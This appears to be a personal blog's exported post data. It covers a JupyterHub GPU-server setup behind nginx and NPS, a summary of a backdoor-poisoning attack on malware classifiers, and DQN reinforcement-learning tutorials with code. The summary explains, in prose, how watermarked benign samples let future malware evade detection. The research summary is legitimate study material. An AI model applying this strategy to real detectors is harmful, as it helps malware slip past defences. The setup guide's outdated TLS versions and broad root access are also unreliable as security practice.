{"meta":{"title":"の","subtitle":null,"description":null,"author":"Supervampire","url":"https://wxt406611016.github.io","root":"/"},"pages":[{"title":"About Me","date":"2021-01-21T16:43:39.382Z","updated":"2021-01-21T16:43:39.378Z","comments":true,"path":"about/index.html","permalink":"https://wxt406611016.github.io/about/index.html","excerpt":"","text":"Master candidate from UCAS, School of Cyberspace Security. Name SuperVampire Birth 1997 City Beijing Department Institute of Information Engineering Github https://github.com/wxt406611016 QQ 406611016"},{"title":"categories","date":"2021-01-17T16:00:11.358Z","updated":"2021-01-17T16:00:11.354Z","comments":true,"path":"categories/index.html","permalink":"https://wxt406611016.github.io/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-01-17T16:25:45.399Z","updated":"2021-01-17T16:25:45.395Z","comments":true,"path":"friends/index.html","permalink":"https://wxt406611016.github.io/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"Ubuntu环境下多用户Anaconda以及JupyterHub搭建过程+公网nginx反向代理+nps穿透实现通过公网Https访问内网JupyterHub","slug":"jupyterlab","date":"2023-03-04T16:00:00.000Z","updated":"2023-03-05T13:14:55.956Z","comments":true,"path":"2023/03/05/jupyterlab/","link":"","permalink":"https://wxt406611016.github.io/2023/03/05/jupyterlab/","excerpt":"因为现在有一台处于内网环境下的性能非常好的台式机，想要将其作为GPU服务器供大家一同使用，因此需要配置多用户使用的Anaconda环境。为了更好的方便大家跑代码，选择搭建一个JupyterHub，这样大家可以使用JupyterHub的Web界面直接在浏览器上跑自己的代码。考虑到内网因素对大家的使用影响，比如有些同伴可能在外出差无法访问内网服务，却又需要在GPU服务器上跑代码，可以使用NPS对内网进行穿透，通过公网IP访问内网服务。同时又考虑到安全性问题，选择在NPS之前再套一个nginx反向代理，可以实现HTTPS传输流量。","text":"因为现在有一台处于内网环境下的性能非常好的台式机，想要将其作为GPU服务器供大家一同使用，因此需要配置多用户使用的Anaconda环境。为了更好的方便大家跑代码，选择搭建一个JupyterHub，这样大家可以使用JupyterHub的Web界面直接在浏览器上跑自己的代码。考虑到内网因素对大家的使用影响，比如有些同伴可能在外出差无法访问内网服务，却又需要在GPU服务器上跑代码，可以使用NPS对内网进行穿透，通过公网IP访问内网服务。同时又考虑到安全性问题，选择在NPS之前再套一个nginx反向代理，可以实现HTTPS传输流量。 配置GPU驱动和cuda，cudnn Linux换源后，在软件更新里找到驱动，可以选择专用的驱动下载 驱动安装成功后，nvidia-smi命令可以正常运行 通过nvidia-smi可以看到支持的CUDA最高版本 我的设备支持的CUDA最高版本是12.0,因此我选择安装了cuda 11.2版本和cudnn 8.1版本 安装AnacondaAnaconda需要配置多用户使用，因此按照如下步骤，首先以root权限安装conda，而后普通用户再具体配置： root用户安装conda： 以root权限安装conda，安装到所有用户都可以访问的位置（如/opt/anaconda3） 以root权限运行chmod o-w /opt/anaconda3/envs,使普通用户无法在共享环境里写文件 以root权限将源换为国内源 以root权限安装共享环境（如分别安装常用的pytorch,tensorflow环境） 根据我安装的cuda版本，我这里选择安装的pytorch版本为1.8.0，tensorflow版本为2.6.0，通过以下命令安装：123456# pytorch 1.8.0版本 conda环境安装：conda create -n pytorch python&#x3D;3.8.5 # 此时会创建一个名为pytorch的conda环境conda install pytorch&#x3D;&#x3D;1.8.0 torchvision&#x3D;&#x3D;0.9.0 torchaudio&#x3D;&#x3D;0.8.0 cudatoolkit&#x3D;11.1# tensorflow-gpu 2.6.0版本 conda安装：conda create -n tensorflow python&#x3D;3.8.5 # 此时会创建一个名为tensorflow的conda环境conda install tensorflow-gpu&#x3D;2.6.0 普通用户使用conda： 普通用户登录conda前需要先init:/opt/anaconda3/bin/conda init bash 普通用户在conda init后如果通过conda安装新环境会优先考虑安装在共享环境下，但普通用户又没有写权限，从而导致报错，因此需要在用户目录下修改.condarc文件，添加用户安装环境的位置：12envs_dirs: - ~&#x2F;.conda&#x2F;envs #意为优先将环境安装在用户目录下。 安装JupyerHub按照以下步骤安装JupyterHub： 在root权限下，使用conda安装：conda install jupyterhub 修改配置文件 jupyterhub_config.py（因为是root用户安装的jupyterhub，因此该文件一般在root用户目录下）,具体修改如下：12345678910111213141516171819202122# 参考来源：https:&#x2F;&#x2F;blog.csdn.net&#x2F;meiaoxue1234&#x2F;article&#x2F;details&#x2F;123252499# configurable_http_proxy 代理设置c.ConfigurableHTTPProxy.should_start &#x3D; True #允许hub启动代理 可以不写，默认的，为False 就需要自己去 启动configurable-http-proxyc.ConfigurableHTTPProxy.api_url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8001&#39; # proxy与hub与代理通讯，这应该是默认值不行也行 # 对外登录设置的ipc.JupyterHub.ip &#x3D; &#39;x.x.x.x&#39;c.JupyterHub.port &#x3D; 8001c.PAMAuthenticator.encoding &#x3D; &#39;utf8&#39; # 用户名单设置，默认身份验证方式PAM与NUIX系统用户管理层一致，root用户可以添加用户test1,test2等等，非root用户，sudo useradd test1&#x2F;test2 不起作用，# c.Authenticator.allowed_users &#x3D; &#123;&#39;test1&#39;, &#39;test2&#39;&#125;c.Authenticator.admin_users &#x3D; &#123;&#39;root&#39;&#125; # 管理员用户# c.DummyAuthenticator.password &#x3D; &quot;xsxxxx2&quot; # 初始密码设置c.JupyterHub.admin_access &#x3D; True # 则管理员有权在各自计算机上以其他用户身份登录，以进行调试c.LocalAuthenticator.create_system_users&#x3D;True # 此选项通常用于 JupyterHub 的托管部署，以避免在启动服务之前手动创建所有用户 # 设置每个用户的 book类型 和 工作目录（创建.ipynb文件自动保存的地方）c.Spawner.notebook_dir &#x3D; &#39;~&#39;c.Spawner.default_url &#x3D; &#39;&#x2F;lab&#39;c.Spawner.args &#x3D; [&#39;--allow-root&#39;] 在linux终端terminal里给root用户添加密码（不然jupyterhub启动后，没有密码登录不了） 挂载配置文件启动jupyerhub：jupyterhub -f jupyterhub_config.py 以管理员用户登录JupyterHub后，可以添加用户，添加用户后，还需要在终端terminal里给该用户设置密码 考虑是否将该用户加入sudo组（usermod -aG sudo username）,意为将username用户添加进sudo组 虽然已经创建了共享环境（如pytorch,tensorflow），但是此时登录JupyterHub页面后这些共享环境是不显示的，需要安装kernel使得共享环境在JupyterHub页面中显示出来，具体操作如下：123# 以root用户进入共享环境，这里以tensorflow共享环境为例：conda activate tensorflow # 进入tensorflow共享环境python -m ipykernel install --name tensorflow --display-name tensorflow # 为tensorflow环境安装kernel，需要注意的是这里--name后的tensorflow为之前创建的环境名，--display-name后的tensorflow是你希望这个环境在JupyterHub中显示的名字 给环境安装完kernel后，刷新JupyterHub页面，即可显示共享环境的kernel，选择该kernel，就可以使用该共享环境了 普通用户安装conda环境普通用户可以直接重新创建一个全新的环境，也可以克隆共享环境里的其中一个环境，这里具体介绍如何克隆环境，普通用户登录后(非root权限)，依次执行以下命令： source activate # 启动conda环境 conda create -n your_environment_name --clone shared_enviroment_name # clone共享环境 sudo su # 提升为root权限 conda activate path_of_your_environment # 进入刚刚新建的环境 python -m ipykernel install --name your_enviroment_name --display-name new_name #为刚新建的环境安装kernel，并且new_name为用户想要在JupyterHub中显示的Kernel名称 刷新JupyterHub页面，即可以看到刚刚新建的kernel，选择该kernel就可以使用刚创建的环境了 Nginx+NPS实现通过公网Https访问内网JupyterHub的Web界面假设拥有一台公网vps，并给该公网配置了域名(假设为myweb.com)，且假设已经通过NPS实现了以HTTP方式通过公网public_ip:public_port或myweb.com:public_port访问内网JupyterHub服务（localhost_ip:localhost_port）。NPS实现内网穿透网上的教程很多，这里不再赘述。此时可以借助Nginx反向代理实现Https传输和端口隐藏。 在公网vps中安装nginx服务，并在nginx的配置文件下配置如下内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243server&#123; listen 80 default; #监听80端口，即http访问请求 server_name _; return 500;&#125;server &#123; listen 80; # 监听80端口，即http访问请求 listen [::]:80; server_name myweb.com; return 301 https:&#x2F;&#x2F;$server_name$request_uri; # 将所有80端口的访问请求重定向到443端口(https服务)&#125;server &#123; listen 443 ssl default; # 监听443端口，即https访问请求 server_name _; ssl_certificate myweb.com_bundle.crt;# 配置证书（证书文件在买域名的时候会给） ssl_certificate_key myweb.com.key; #hps文件夹下的.key文件 ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置 ssl_prefer_server_ciphers on; return 500;&#125;server &#123; listen 443 ssl; server_name myweb.com; #填写绑定证书的域名 ssl_certificate myweb.com_bundle.crt;# ssl_certificate_key myweb.com.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置 ssl_prefer_server_ciphers on; location &#x2F; &#123; #此处为转发配置 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; proxy_set_header X-Scheme $scheme; proxy_buffering off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http:&#x2F;&#x2F;127.0.0.1:public_port&#x2F;; &#125;&#125; 配置文件中location部分的目的是将对 https://myweb.com 的访问请求代理转发到 http://127.0.0.1:public_port/，这里的127.0.0.1是公网vps的本地地址，因此这里的127.0.0.1就相当于公网的ip，而之前又通过配置NPS将对公网的 http://127.0.0.1:public_port/ 的访问请求转发到内网本地的 localhost_ip:localhost_port。因此通过两层代理转发实现了通过公网HTTPS服务访问内网的JupyterHub的web服务，并且隐藏了public_port这一端口。 ！！！注意，配置文件中的location部分，proxy的设置不能少，不然以HTTPS方式访问内网JupyterHub时会出现权限错误，因为并不是所有流量都以https传输，会存在一些http流量被重定向到https（如nginx的配置文件里，将监听到的所有80端口的流量都重定向到https），而这些重定向的http流量就会引起权限问题，这是因为jupyterhub会对协议是否相同来认证权限。具体请参考网址：https://jupyterhub.readthedocs.io/en/stable/reference/config-proxy.html 此时重启nginx服务service nginx restart即可实现通过https://myweb.com/ 以https的方式访问内网的JupyterHub的Web服务。","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"anaconda,jupyterlab","slug":"anaconda-jupyterlab","permalink":"https://wxt406611016.github.io/tags/anaconda-jupyterlab/"}]},{"title":"论文分析：《Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers》","slug":"Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers","date":"2022-01-12T16:00:00.000Z","updated":"2022-01-13T08:08:09.204Z","comments":true,"path":"2022/01/13/Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers/","link":"","permalink":"https://wxt406611016.github.io/2022/01/13/Explanation-Guided%20Backdoor%20Poisoning%20Attacks%20Against%20Malware%20Classifiers/","excerpt":"Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers 论文目的 研究内容： 研究针对基于ml的恶意软件分类器的clean-label后门攻击； 研究效果： 将带有后门的良性样本注入恶意软件检测器的训练集中，改变在推断时对带有相同水印的恶意软件样本的预测；","text":"Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers 论文目的 研究内容： 研究针对基于ml的恶意软件分类器的clean-label后门攻击； 研究效果： 将带有后门的良性样本注入恶意软件检测器的训练集中，改变在推断时对带有相同水印的恶意软件样本的预测； 主要工具： SHAP（SHapley Additive explanation） 研究意义： 第三方威胁情报平台允许用户(包括攻击者)提交样本，这些样本由二进制文件上运行的现有反病毒(AV)引擎池标记。公司可以从这些平台获取标签数据。训练过程包括一个特征提取步骤(在本例中是PE文件的静态分析)，然后是ML算法训练过程。然后将训练过的恶意软件分类器部署在野外，并应用于新的二进制文件，以生成标签。因此，对手的目标是生成带有后门的良性二进制文件，这些二进制文件将通过这些标签平台传播，并将毒害下游恶意软件分类器的训练集。一旦模型被部署，攻击者将简单地在恶意二进制文件发布之前引入相同的水印，从而确保新的恶意软件活动将躲避后门分类器的检测。 攻击者目标： 改变训练过程，使得到的后门分类器 $F_b$ 不同于经过干净训练的分类器 $F$ ，一个理想的 $F_b$ 对一组干净的输入 $x$ 有与 $F$ 完全相同的响应，而当应用到后门输入 $x_b$ 时，它生成一个对抗性选择的预测 $y_b$。 $F_b(x)=F(x)$ $F(x_b)=y$ $F_b(x_b)=y_b≠y$ 为了使攻击不被察觉，对抗者希望最小化poison set和footprint of the trigger(修改特征的数量)。 攻击者能力： 研究思想： 在后门中毒攻击中，对手利用对特征(子集)的控制来导致错误分类，因为这些特征维度中存在中毒值。直观地说，攻击在包含触发器的特征子空间内创建一个密度区域，分类器调整其决策边界以适应有毒样本的密度。（即使攻击者只控制一个相对较小的子空间,他们仍然可以影响决策边界：如果有水印点的密度足够高, 或者周围的数据点足够稀疏, 或水印占有一个特别薄弱区域的决策边界模型的置信度很低。） 攻击思路：（两个想法） 搜索决策边界附近的弱可信度区域，在那里水印可以淹没现有的弱证据; 破坏已经严重面向良性样本的区域，使后门子空间的密度压倒来自其他附近样本的信号。 研究方法： 特征选择器： LargeSHAP：对单个特征的SHAP值进行求和。SHAP值越大，越对goodware的决策重要，反之SHAP值越小，越对malware的决策重要。SHAP值接近0的特征表示是对决策可信度较弱的区域； LargeAbsSHAP：对单个特征的SHAP绝对值求和，忽略方向性，即发现特征对模型总体的重要性，而不管决策边界的方向。 值选择器： MinPopulation: 从子空间的稀疏区域中选择值，简单地在数据集中寻找出现频率最少的值，好处是保证了二进制的语义有效性； CountSHAP：从高密度的指向goodware的区域中选择值，好处是将水印融入到goodware的背景数据中。 CountAbsSHAP:和CountSHAP类似，寻找出现频率越高，且越对决策无关的值； 攻击策略： Independent Selection： 搜索决策边界附近的弱置信区域，在那里水印可以压倒现有的弱证据。使用LargeAbsSHAP选择最重要的特性，然后使用MinPopulation或CountAbsSHAP选择值。虽然我们发现这种攻击强烈地影响决策边界，缺点是由于水印数据点的独特性，创建出来的backdoor不靠近任何子空间，因此它也相对容易防御。 Greedy Combined Selection： 虽然上述的独立选择策略侧重于基于决策边界的薄弱区域识别最有效的水印，但在某些情况下，我们可能希望更仔细地将水印融入背景数据集，并确保保持特征之间的语义关系。在Combined策略中，我们使用贪婪算法有条件地选择新的特征维及其值，使这些值与攻击者数据集中已有的面向goodware的点一致。我们首先使用LargeSHAP选择最面向goodware的特征维度，然后使用CountSHAP选择该维度中密度最高、面向goodware的值。接下来，我们删除所有不具有所选值的数据点，并对以当前触发器为条件的数据子集重复该过程。直观地，我们可以把这个过程看作从现有的goodware样本中识别出语义一致的特征子空间，这些特征子空间可以作为backdoor转移到malware中。 实验: 实验数据集： EMBER 实验模型： LightGBM，EmberNN 实验结果： 无限制场景： 限制场景（PE, PDF, Android）：","categories":[{"name":"论文","slug":"论文","permalink":"https://wxt406611016.github.io/categories/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"神经网络，恶意代码","slug":"神经网络，恶意代码","permalink":"https://wxt406611016.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%EF%BC%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}]},{"title":"Deep Q Network(DQN)在LunarLander-v2上的应用","slug":"dqn-LunarLander-v2","date":"2021-12-07T16:00:00.000Z","updated":"2021-12-09T03:28:30.671Z","comments":true,"path":"2021/12/08/dqn-LunarLander-v2/","link":"","permalink":"https://wxt406611016.github.io/2021/12/08/dqn-LunarLander-v2/","excerpt":"关于QLearning、为什么使用神经网络来决定智能体的动作选择以及如何更新神经网络在上一篇文章《Deep Q Network(DQN)在CartPole-v0上的应用》中已经解释过，不得不说，神经网络作为Q函数的确发挥了重要的作用，这一篇趁热打铁，我们玩另一款游戏在月球登陆，下面将给出DQN在LunarLander-v2上的应用的代码。","text":"关于QLearning、为什么使用神经网络来决定智能体的动作选择以及如何更新神经网络在上一篇文章《Deep Q Network(DQN)在CartPole-v0上的应用》中已经解释过，不得不说，神经网络作为Q函数的确发挥了重要的作用，这一篇趁热打铁，我们玩另一款游戏在月球登陆，下面将给出DQN在LunarLander-v2上的应用的代码。 DQN在LunarLander-v2(gym)上的应用首先看模型未训练前效果： 对应的奖励如下所示，可以看到毫无policy可言，效果一塌糊涂： 1234reward_sum:-153.79reward_sum:-119.95reward_sum:-126.0reward_sum:-137.3 为了改善这个情况，接下来需要训练模型。 训练模型： 依赖环境： 12345torch&#x3D;&#x3D;1.9.0gym&#x3D;&#x3D;0.21.0swig（通过conda安装）box2d-py&#x3D;&#x3D;2.3.8##如果不安装swig和box2d-py会报错无法加载LunarLander-v2 main.py :（训练网络） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243import gymimport randomimport torchimport numpy as npfrom collections import namedtuple, dequeimport matplotlib.pyplot as plt%matplotlib inline# pytorch importsimport torchimport torch.nn as nnimport torch.nn.functional as Fimport torch.optim as optimenv &#x3D; gym.make(&#39;LunarLander-v2&#39;)env.seed(0)print(&#39;State shape: &#39;, env.observation_space.shape)print(&#39;Number of Actions: &#39;, env.action_space.n)class QNetwork(nn.Module): &quot;&quot;&quot;Actor (Policy) Model.&quot;&quot;&quot; def __init__(self, state_size, action_size, seed, fc1_units&#x3D;64, fc2_units&#x3D;64): &quot;&quot;&quot;Initialize parameters and build model. Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; state_size (int): Dimension of each state action_size (int): Dimension of each action seed (int): Random seed fc1_units (int): Number of nodes in first hidden layer fc2_units (int): Number of nodes in second hidden layer &quot;&quot;&quot; super(QNetwork, self).__init__() self.seed &#x3D; torch.manual_seed(seed) self.fc1 &#x3D; nn.Linear(state_size, fc1_units) self.fc2 &#x3D; nn.Linear(fc1_units, fc2_units) self.fc3 &#x3D; nn.Linear(fc2_units, action_size) def forward(self, state): &quot;&quot;&quot;Build a network that maps state -&gt; action values.&quot;&quot;&quot; x &#x3D; F.relu(self.fc1(state)) x &#x3D; F.relu(self.fc2(x)) return self.fc3(x) # Define the DQN hyperparametersBUFFER_SIZE &#x3D; int(1e5) # replay buffer sizeBATCH_SIZE &#x3D; 64 # minibatch sizeGAMMA &#x3D; 0.99 # discount factorTAU &#x3D; 1e-3 # for soft update of target parametersLR &#x3D; 5e-4 # learning rate UPDATE_EVERY &#x3D; 4 # how often to update the network# Use GPU is possible else use CPUdevice &#x3D; torch.device(&quot;cuda:0&quot; if torch.cuda.is_available() else &quot;cpu&quot;)class Agent(): &quot;&quot;&quot;Interacts with and learns from the environment.&quot;&quot;&quot; def __init__(self, state_size, action_size, seed): &quot;&quot;&quot;Initialize an Agent object. Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; state_size (int): dimension of each state action_size (int): dimension of each action seed (int): random seed &quot;&quot;&quot; self.state_size &#x3D; state_size self.action_size &#x3D; action_size self.seed &#x3D; random.seed(seed) # Q-Network self.qnetwork_local &#x3D; QNetwork(state_size, action_size, seed).to(device) self.qnetwork_target &#x3D; QNetwork(state_size, action_size, seed).to(device) self.optimizer &#x3D; optim.Adam(self.qnetwork_local.parameters(), lr&#x3D;LR) # Replay memory self.memory &#x3D; ReplayBuffer(action_size, BUFFER_SIZE, BATCH_SIZE, seed) # Initialize time step (for updating every UPDATE_EVERY steps) self.t_step &#x3D; 0 def step(self, state, action, reward, next_state, done): # Save experience in replay memory self.memory.add(state, action, reward, next_state, done) # Learn every UPDATE_EVERY time steps. self.t_step &#x3D; (self.t_step + 1) % UPDATE_EVERY if self.t_step &#x3D;&#x3D; 0: # If enough samples are available in memory, get random subset and learn if len(self.memory) &gt; BATCH_SIZE: experiences &#x3D; self.memory.sample() self.learn(experiences, GAMMA) def act(self, state, eps&#x3D;0.): &quot;&quot;&quot;Returns actions for given state as per current policy. Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; state (array_like): current state eps (float): epsilon, for epsilon-greedy action selection &quot;&quot;&quot; state &#x3D; torch.from_numpy(state).float().unsqueeze(0).to(device) self.qnetwork_local.eval() with torch.no_grad(): action_values &#x3D; self.qnetwork_local(state) self.qnetwork_local.train() # Epsilon-greedy action selection if random.random() &gt; eps: return np.argmax(action_values.cpu().data.numpy()) else: return random.choice(np.arange(self.action_size)) def learn(self, experiences, gamma): &quot;&quot;&quot;Update value parameters using given batch of experience tuples. Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; experiences (Tuple[torch.Tensor]): tuple of (s, a, r, s&#39;, done) tuples gamma (float): discount factor &quot;&quot;&quot; states, actions, rewards, next_states, dones &#x3D; experiences # Get max predicted Q values (for next states) from target model Q_targets_next &#x3D; self.qnetwork_target(next_states).detach().max(1)[0].unsqueeze(1) # Compute Q targets for current states Q_targets &#x3D; rewards + (gamma * Q_targets_next * (1 - dones)) # Get expected Q values from local model Q_expected &#x3D; self.qnetwork_local(states).gather(1, actions) # Compute loss loss &#x3D; F.mse_loss(Q_expected, Q_targets) # Minimize the loss self.optimizer.zero_grad() loss.backward() self.optimizer.step() # ------------------- update target network ------------------- # self.soft_update(self.qnetwork_local, self.qnetwork_target, TAU) def soft_update(self, local_model, target_model, tau): &quot;&quot;&quot;Soft update model parameters. θ_target &#x3D; τ*θ_local + (1 - τ)*θ_target Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; local_model (PyTorch model): weights will be copied from target_model (PyTorch model): weights will be copied to tau (float): interpolation parameter &quot;&quot;&quot; for target_param, local_param in zip(target_model.parameters(), local_model.parameters()): target_param.data.copy_(tau*local_param.data + (1.0-tau)*target_param.data)class ReplayBuffer: &quot;&quot;&quot;Fixed-size buffer to store experience tuples.&quot;&quot;&quot; def __init__(self, action_size, buffer_size, batch_size, seed): &quot;&quot;&quot;Initialize a ReplayBuffer object. Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; action_size (int): dimension of each action buffer_size (int): maximum size of buffer batch_size (int): size of each training batch seed (int): random seed &quot;&quot;&quot; self.action_size &#x3D; action_size self.memory &#x3D; deque(maxlen&#x3D;buffer_size) self.batch_size &#x3D; batch_size self.experience &#x3D; namedtuple(&quot;Experience&quot;, field_names&#x3D;[&quot;state&quot;, &quot;action&quot;, &quot;reward&quot;, &quot;next_state&quot;, &quot;done&quot;]) self.seed &#x3D; random.seed(seed) def add(self, state, action, reward, next_state, done): &quot;&quot;&quot;Add a new experience to memory.&quot;&quot;&quot; e &#x3D; self.experience(state, action, reward, next_state, done) self.memory.append(e) def sample(self): &quot;&quot;&quot;Randomly sample a batch of experiences from memory.&quot;&quot;&quot; experiences &#x3D; random.sample(self.memory, k&#x3D;self.batch_size) states &#x3D; torch.from_numpy(np.vstack([e.state for e in experiences if e is not None])).float().to(device) actions &#x3D; torch.from_numpy(np.vstack([e.action for e in experiences if e is not None])).long().to(device) rewards &#x3D; torch.from_numpy(np.vstack([e.reward for e in experiences if e is not None])).float().to(device) next_states &#x3D; torch.from_numpy(np.vstack([e.next_state for e in experiences if e is not None])).float().to(device) dones &#x3D; torch.from_numpy(np.vstack([e.done for e in experiences if e is not None]).astype(np.uint8)).float().to(device) return (states, actions, rewards, next_states, dones) def __len__(self): &quot;&quot;&quot;Return the current size of internal memory.&quot;&quot;&quot; return len(self.memory) agent &#x3D; Agent(state_size&#x3D;8, action_size&#x3D;4, seed&#x3D;0)def dqn(n_episodes&#x3D;4000, max_t&#x3D;1000, eps_start&#x3D;1.0, eps_end&#x3D;0.01, eps_decay&#x3D;0.995): &quot;&quot;&quot;Deep Q-Learning. Params &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; n_episodes (int): maximum number of training episodes max_t (int): maximum number of timesteps per episode eps_start (float): starting value of epsilon, for epsilon-greedy action selection eps_end (float): minimum value of epsilon eps_decay (float): multiplicative factor (per episode) for decreasing epsilon &quot;&quot;&quot; scores &#x3D; [] # list containing scores from each episode scores_window &#x3D; deque(maxlen&#x3D;100) # last 100 scores eps &#x3D; eps_start # initialize epsilon for i_episode in range(1, n_episodes+1): state &#x3D; env.reset() score &#x3D; 0 for t in range(max_t): action &#x3D; agent.act(state, eps) next_state, reward, done, _ &#x3D; env.step(action) agent.step(state, action, reward, next_state, done) state &#x3D; next_state score +&#x3D; reward if done: break scores_window.append(score) # save most recent score scores.append(score) # save most recent score eps &#x3D; max(eps_end, eps_decay*eps) # decrease epsilon print(&#39;\\rEpisode &#123;&#125;\\tAverage Score: &#123;:.2f&#125;&#39;.format(i_episode, np.mean(scores_window)), end&#x3D;&quot;&quot;) if i_episode % 100 &#x3D;&#x3D; 0: print(&#39;\\rEpisode &#123;&#125;\\tAverage Score: &#123;:.2f&#125;&#39;.format(i_episode, np.mean(scores_window))) if np.mean(scores_window)&gt;&#x3D;250.0: print(&#39;\\nEnvironment solved in &#123;:d&#125; episodes!\\tAverage Score: &#123;:.2f&#125;&#39;.format(i_episode-100, np.mean(scores_window))) torch.save(agent.qnetwork_local.state_dict(), &#39;checkpoint_v2.pth&#39;) break return scoresscores &#x3D; dqn()# plot the scoresfig &#x3D; plt.figure()ax &#x3D; fig.add_subplot(111)plt.plot(np.arange(len(scores)), scores)plt.ylabel(&#39;Score&#39;)plt.xlabel(&#39;Episode #&#39;)plt.show() 训练过程中终端输出如下： 可以看出在reward_mean大于250时程序停止，同时得到checkpoint_v2.pth文件，可用于测试训练的效果，测试代码如下所示： test.py : （测试模型学习的效果） 12345678910111213141516171819202122from dqn_agent import Agentimport torchimport gymenv &#x3D; gym.make(&#39;LunarLander-v2&#39;)env.seed(0)agent &#x3D; Agent(state_size&#x3D;8, action_size&#x3D;4, seed&#x3D;0)agent.qnetwork_local.load_state_dict(torch.load(&#39;.&#x2F;checkpoint_v2.pth&#39;))while True: state &#x3D; env.reset() episode_reward_sum &#x3D; 0 while True: env.render() action &#x3D; agent.act(state) state, reward, done, _ &#x3D; env.step(action) episode_reward_sum +&#x3D; reward if done: print(f&#39;reward_sum:&#123;round(episode_reward_sum, 2)&#125;&#39;) breakenv.close() 动画效果如下，测试的获得奖励情况在终端中有显示，如下: 1234reward_sum:253.87reward_sum:232.45reward_sum:277.11reward_sum:291.65 jupyter代码在github上可以获取，点击传送至Github","categories":[{"name":"RL","slug":"RL","permalink":"https://wxt406611016.github.io/categories/RL/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://wxt406611016.github.io/tags/Machine-Learning/"}]},{"title":"Deep Q Network(DQN)在CartPole-v0上的应用","slug":"dqn-CartPole-v0","date":"2021-12-06T16:00:00.000Z","updated":"2021-12-09T03:26:07.361Z","comments":true,"path":"2021/12/07/dqn-CartPole-v0/","link":"","permalink":"https://wxt406611016.github.io/2021/12/07/dqn-CartPole-v0/","excerpt":"如今, 随着机器学习在日常生活中的各种应用, 各种机器学习方法也在融汇, 合并, 升级. 而我们今天所要探讨的强化学习则是这么一种融合了神经网络和 Q learning 的方法, 名字叫做 Deep Q Network. 这种新型结构是为什么被提出来呢? 原来, 传统的表格形式的强化学习有这样一个瓶颈。","text":"如今, 随着机器学习在日常生活中的各种应用, 各种机器学习方法也在融汇, 合并, 升级. 而我们今天所要探讨的强化学习则是这么一种融合了神经网络和 Q learning 的方法, 名字叫做 Deep Q Network. 这种新型结构是为什么被提出来呢? 原来, 传统的表格形式的强化学习有这样一个瓶颈。 QLearningQLearning是强化学习算法中value-based的算法，Q即为Q（s,a）就是在某一时刻的 s 状态下(s∈S)，采取 动作a (a∈A)动作能够获得收益的期望，环境会根据agent的动作反馈相应的回报reward r，所以算法的主要思想就是将State与Action构建成一张Q-table来存储Q值，然后根据Q值来选取能够获得最大的收益的动作。 Q-Table a1 a2 s1 q(s1,a1) q(s1,a2) s2 q(s2,a1) q(s2,a2) s3 q(s3,a1) q(s3,a2) Qlearning的主要优势就是使用了时间差分法TD（融合了蒙特卡洛和动态规划）能够进行离线学习, 使用bellman方程可以对马尔科夫过程求解最优策略。Q(s,a)状态动作值函数 其中Gt是从t时刻开始的总折扣奖励，从这里我们能看出来 γ衰变值对Q函数的影响，γ越接近于1代表它越有远见会着重考虑后续状态的的价值，当γ接近0的时候就会变得近视只考虑当前的利益的影响。所以从0到1，算法就会越来越会考虑后续回报的影响。 为什么使用神经网络(为什么提出DQN)我们使用表格来存储每一个状态 state, 和在这个 state 每个行为 action 所拥有的 Q 值. 而当今问题是在太复杂, 状态可以多到比天上的星星还多(比如下围棋). 如果全用表格来存储它们, 恐怕我们的计算机有再大的内存都不够, 而且每次在这么大的表格中搜索对应的状态也是一件很耗时的事. 不过, 在机器学习中, 有一种方法对这种事情很在行, 那就是神经网络. 我们可以将状态和动作当成神经网络的输入, 然后经过神经网络分析后得到动作的 Q 值, 这样我们就没必要在表格中记录 Q 值, 而是直接使用神经网络生成 Q 值. 还有一种形式的是这样, 我们也能只输入状态值, 输出所有的动作值, 然后按照 Q learning 的原则, 直接选择拥有最大值的动作当做下一步要做的动作. 我们可以想象, 神经网络接受外部的信息, 相当于眼睛鼻子耳朵收集信息, 然后通过大脑加工输出每种动作的值, 最后通过强化学习的方式选择动作. 如何更新神经网络接下来我们基于第二种神经网络来分析, 我们知道, 神经网络是要被训练才能预测出准确的值. 那在强化学习中, 神经网络是如何被训练的呢? 首先, 我们需要 a1, a2 正确的Q值, 这个 Q 值我们就用之前在 Q learning 中的 Q 现实来代替. 同样我们还需要一个 Q 估计 来实现神经网络的更新. 